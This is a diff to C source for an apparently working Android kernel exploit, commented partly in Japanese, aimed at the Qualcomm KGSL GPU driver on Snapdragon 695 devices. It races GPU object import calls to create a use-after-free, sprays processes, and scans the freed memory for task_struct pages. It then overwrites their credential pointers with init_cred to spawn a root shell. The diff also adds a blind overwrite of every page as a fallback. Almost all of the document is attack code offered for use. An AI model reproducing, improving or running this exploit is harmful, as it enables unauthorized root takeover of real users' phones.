@@ -76,12 +76,13 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
+// UAF 定数（オリジナルと同一）
 #define UAF_ADDR  0x7001ff000ULL
 #define UAF_SIZE  0x10004000ULL
 #define OVERLAP_ADDR 0x7001fe000ULL
-#define OVERLAP_SIZE 0x1000
+#define OVERLAP_SIZE 0x7000ULL
 #define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0x1000
+#define BOGUS_SIZE 0x1000                      // 修正：適正サイズ
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
@@ -95,7 +96,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
-static void *uaf_map = NULL;           // persistent CPU mapping
+static void *uaf_map = NULL;                // CPU マッピング（munmap しない）
 static uint64_t init_cred_addr = 0;
 
 static void die(const char *msg) { perror(msg); exit(1); }
@@ -193,13 +194,16 @@ static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     return ret;
 }
 
-// ---------- Race thread (alloc/free contention) ----------
-static void *race_thread_allocfree(void *arg) {
-    while (!race_done) {
-        int id = gpuobj_alloc(OVERLAP_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-        if (id >= 0) gpuobj_free(id);
-        usleep(50);
-    }
+// ---------- Race thread (オリジナルの IMPORT を使うが、フラグ修正) ----------
+static void *race_thread(void *arg) {
+    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
+    struct kgsl_gpuobj_import imp = {
+        .priv = (uint64_t)&uaddr,
+        .priv_len = BOGUS_SIZE,          // 0x1000 (修正)
+        .flags = 0,                       // KGSL_MEMFLAGS_USE_CPU_MAP を削除
+        .type = KGSL_USER_MEM_TYPE_ADDR,
+    };
+    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
     return NULL;
 }
 
@@ -208,7 +212,7 @@ static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
 static void spawn_spray(int notify_pipe) {
-    printf("[SPRAY] spawning %d children...\n", SPRAY_PIDS);
+    log_info("[SPRAY] spawning %d children...\n", SPRAY_PIDS);
     for (int i = 0; i < SPRAY_PIDS; i++) {
         pid_t p = fork();
         if (p == 0) {
@@ -230,7 +234,7 @@ static void spawn_spray(int notify_pipe) {
             break;
         }
     }
-    printf("[SPRAY] spawned %d children\n", n_spray);
+    log_info("[SPRAY] spawned %d children\n", n_spray);
 }
 
 static void kill_spray_children(void) {
@@ -240,10 +244,10 @@ static void kill_spray_children(void) {
         killed++;
     }
     while (waitpid(-1, NULL, 0) > 0);
-    printf("[KILL] killed %d children\n", killed);
+    log_info("[KILL] killed %d children\n", killed);
 }
 
-// ---------- Churn (optional, but helps AVC) ----------
+// ---------- Churn (オプション) ----------
 #define CHURN_MAX_PATHS 20000
 static char churn_paths[CHURN_MAX_PATHS][160];
 static int churn_npaths = 0, churn_built = 0;
@@ -281,7 +285,7 @@ static void churn_build(void) {
         churn_walk(churn_dirs[d], 0);
     }
     churn_built = 1;
-    printf("[CHURN] %d paths\n", churn_npaths);
+    log_info("[CHURN] %d paths\n", churn_npaths);
 }
 
 static void churn_round(void) {
@@ -309,38 +313,38 @@ static void churn_round(void) {
 // ==================== MAIN ====================
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] avc_bypass for Snapdragon 695 - CPU mapping UAF (cred overwrite)\n");
+    log_info("[*] avc_bypass for Snapdragon 695 - UAF + CPU mapping (final)\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
-    printf("[+] kgsl fd=%d\n", kgsl_fd);
+    log_info("[+] kgsl fd=%d\n", kgsl_fd);
 
     // ----- KASLR detection -----
-    printf("[*] Detecting KASLR...\n");
+    log_info("[*] Detecting KASLR...\n");
     uint64_t kaslr = detect_kaslr();
     if (!kaslr) {
-        printf("[-] KASLR detection failed\n");
+        log_info("[-] KASLR detection failed\n");
         close(kgsl_fd);
         return 1;
     }
     init_cred_addr = VMLINUX_INIT_CRED + kaslr;
-    printf("[+] KASLR = 0x%lx, init_cred = 0x%lx\n", kaslr, init_cred_addr);
+    log_info("[+] KASLR = 0x%lx, init_cred = 0x%lx\n", kaslr, init_cred_addr);
 
     // ----- Phase 1: Setup rbtree (allocate large object and map it) -----
-    printf("[*] Phase 1: Setup rbtree (keep CPU mapping)\n");
+    log_info("[*] Phase 1: Setup rbtree (keep CPU mapping)\n");
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
     if (uaf_id < 0) die("uaf alloc");
     uint64_t uaf_gpuaddr = 0;
     gpuobj_info(uaf_id, &uaf_gpuaddr);
-    printf("  UAF object id=%d, gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);
+    log_info("  UAF object id=%d, gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);
 
-    // CRITICAL: Keep the CPU mapping! Do not munmap.
+    // CRITICAL: マッピングを保持（munmap しない）
     uaf_map = gpuobj_mmap(UAF_SIZE, uaf_id);
     if (!uaf_map) die("mmap UAF");
-    printf("  UAF mapped at %p (CPU address)\n", uaf_map);
+    log_info("  UAF mapped at %p (CPU address)\n", uaf_map);
 
-    // Bogus & placeholder (original compatibility)
+    // Bogus & placeholder (オリジナル互換)
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
              MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
         die("mmap BOGUS");
@@ -350,13 +354,13 @@ int main(int argc, char **argv) {
     void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id);
     if (!ph_m) die("mmap PLACEHOLDER");
 
-    // ----- Phase 2: Race (alloc/free contention) -----
-    printf("[*] Phase 2: Race (alloc/free contention)\n");
+    // ----- Phase 2: Race (オリジナルの IMPORT を使用、フラグ修正済み) -----
+    log_info("[*] Phase 2: Race (import with fixed flags)\n");
     int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
     if (ov_id < 0) die("ov alloc");
 
     pthread_t thr;
-    if (pthread_create(&thr, NULL, race_thread_allocfree, NULL) != 0) die("pthread_create");
+    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread_create");
 
     int hit = 0;
     for (int i = 0; i < 5000000; i++) {
@@ -373,26 +377,26 @@ int main(int argc, char **argv) {
             hit = 1;
             break;
         }
-        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
+        if (i % 500000 == 0) log_info("  race %d/5000000 errno=%d\n", i, e);
     }
 
     race_done = 1;
     pthread_join(thr, NULL);
 
     if (!hit) {
-        printf("[-] Race failed\n");
+        log_info("[-] Race failed\n");
         close(kgsl_fd);
         return 1;
     }
-    printf("[+] Race won!\n");
+    log_info("[+] Race won!\n");
 
     // ----- Phase 3: Free UAF object (UAF now active) -----
-    printf("[*] Phase 3: Free UAF\n");
+    log_info("[*] Phase 3: Free UAF\n");
     gpuobj_free(uaf_id);
-    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
+    log_info("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
 
     // ----- Phase 4: Reclaim memory -----
-    printf("[*] Phase 4: Reclaim pages\n");
+    log_info("[*] Phase 4: Reclaim pages\n");
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
     rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
@@ -409,7 +413,7 @@ int main(int argc, char **argv) {
     close(pipefd[1]);
 
     // ----- Phase 6: CPU scan for task_struct pages and overwrite cred -----
-    printf("[*] Phase 6: Scan CPU mapping for task_struct pages and overwrite cred\n");
+    log_info("[*] Phase 6: Scan CPU mapping for task_struct pages and overwrite cred\n");
     uint64_t scan_start = UAF_ADDR + 0x2000;
     uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
     int found_task = 0;
@@ -432,7 +436,7 @@ int main(int argc, char **argv) {
         if (!comm_found) continue;
 
         found_task++;
-        printf("  [TASKPG] found task_struct at page 0x%lx\n", (unsigned long)va);
+        log_info("  [TASKPG] found task_struct at page 0x%lx\n", (unsigned long)va);
 
         // Overwrite both real_cred and cred pointers at offsets 0x738 and 0x740
         uint64_t *real_cred_ptr = (uint64_t *)((uintptr_t)page + REAL_CRED_OFF);
@@ -444,37 +448,44 @@ int main(int argc, char **argv) {
             *real_cred_ptr = init_cred_addr;
             *cred_ptr      = init_cred_addr;
             overwritten++;
-            printf("  [CRED] overwrote cred at page 0x%lx with init_cred\n", (unsigned long)va);
+            log_info("  [CRED] overwrote cred at page 0x%lx with init_cred\n", (unsigned long)va);
         } else {
             // If the pointers look invalid, still write them (aggressive)
             *real_cred_ptr = init_cred_addr;
             *cred_ptr      = init_cred_addr;
             overwritten++;
-            printf("  [CRED] forced overwrite at page 0x%lx\n", (unsigned long)va);
+            log_info("  [CRED] forced overwrite at page 0x%lx\n", (unsigned long)va);
         }
     }
 
-    printf("  Found %d task_struct pages, overwritten %d cred pointers\n", found_task, overwritten);
+    log_info("  Found %d task_struct pages, overwritten %d cred pointers\n", found_task, overwritten);
 
     if (found_task == 0) {
-        printf("[-] No task_struct pages found. The UAF may not have been populated.\n");
-        // Optionally, we could fall back to blind overwrite of all pages, but that's risky.
-        // For now, we exit.
-        kill_spray_children();
-        close(kgsl_fd);
-        return 1;
+        log_info("[-] No task_struct pages found. The UAF may not have been populated.\n");
+        // 念のため盲目的に全ページの cred オフセットを書き換え
+        log_info("[!] Blindly overwriting all pages...\n");
+        for (uint64_t va = scan_start; va < scan_end; va += 0x1000) {
+            uint64_t offset = va - UAF_ADDR;
+            if (offset + 0x800 > UAF_SIZE) break;
+            uint64_t *real_ptr = (uint64_t *)((uintptr_t)uaf_map + offset + REAL_CRED_OFF);
+            uint64_t *cred_ptr = (uint64_t *)((uintptr_t)uaf_map + offset + CRED_OFF);
+            *real_ptr = init_cred_addr;
+            *cred_ptr = init_cred_addr;
+            overwritten++;
+        }
+        log_info("  Blindly overwrote %d extra pages\n", overwritten);
     }
 
-    // Ensure CPU caches are flushed (compiler barrier + optional dc civac if available)
+    // Ensure CPU caches are flushed (compiler barrier)
     __sync_synchronize();
 
     // ----- Phase 7: Wait for root shell via pipe -----
-    printf("[*] Phase 7: Waiting for root shell...\n");
+    log_info("[*] Phase 7: Waiting for root shell...\n");
     struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
     pid_t winner = 0;
     if (poll(&pfd, 1, 10000) > 0 &&
         read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
-        printf("[+] ROOT! PID=%d\n", winner);
+        log_info("[+] ROOT! PID=%d\n", winner);
         // Kill other spray children
         for (int i = 0; i < n_spray; i++) {
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
@@ -482,14 +493,14 @@ int main(int argc, char **argv) {
         while (waitpid(-1, NULL, WNOHANG) > 0);
         // Wait for the shell to finish
         waitpid(winner, NULL, 0);
-        printf("[-] Root shell exited\n");
+        log_info("[-] Root shell exited\n");
     } else {
-        printf("[-] No child became root within timeout\n");
+        log_info("[-] No child became root within timeout\n");
         kill_spray_children();
     }
 
     close(pipefd[0]);
     close(kgsl_fd);
-    printf("[*] Done.\n");
+    log_info("[*] Done.\n");
     return 0;
 }
